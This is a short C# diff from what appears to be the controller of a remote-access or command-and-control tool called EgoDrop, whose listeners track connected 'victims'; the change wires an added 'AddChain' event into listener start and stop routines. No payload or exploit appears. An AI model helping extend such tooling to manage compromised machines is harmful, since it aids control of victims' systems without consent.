@@ -88,10 +88,12 @@ namespace EgoDrop
                 listener.evtNewVictim -= m_fMain.fnOnNewVictim;
                 listener.evtReceivedMessage -= m_fMain.fnReceivedMessage;
                 listener.evtVictimDisconnected -= m_fMain.fnOnVictimDisconnected;
+                listener.evtAddChain -= m_fMain.fnOnAddChain;
 
                 listener.evtNewVictim += m_fMain.fnOnNewVictim;
                 listener.evtReceivedMessage += m_fMain.fnReceivedMessage;
                 listener.evtVictimDisconnected += m_fMain.fnOnVictimDisconnected;
+                listener.evtAddChain += m_fMain.fnOnAddChain;
 
                 m_fMain.fnSysLog($"Started listener(Name={listener.m_stListener.szName}, Port={listener.m_stListener.nPort}, Protocol={Enum.GetName(listener.m_stListener.protoListener)})");
             }
@@ -112,6 +114,7 @@ namespace EgoDrop
                 listener.evtNewVictim -= m_fMain.fnOnNewVictim;
                 listener.evtReceivedMessage -= m_fMain.fnReceivedMessage;
                 listener.evtVictimDisconnected -= m_fMain.fnOnVictimDisconnected;
+                listener.evtAddChain -= m_fMain.fnOnAddChain;
 
                 m_fMain.fnSysLog($"Stoppped listener: " + listener.m_stListener.szName);
             }
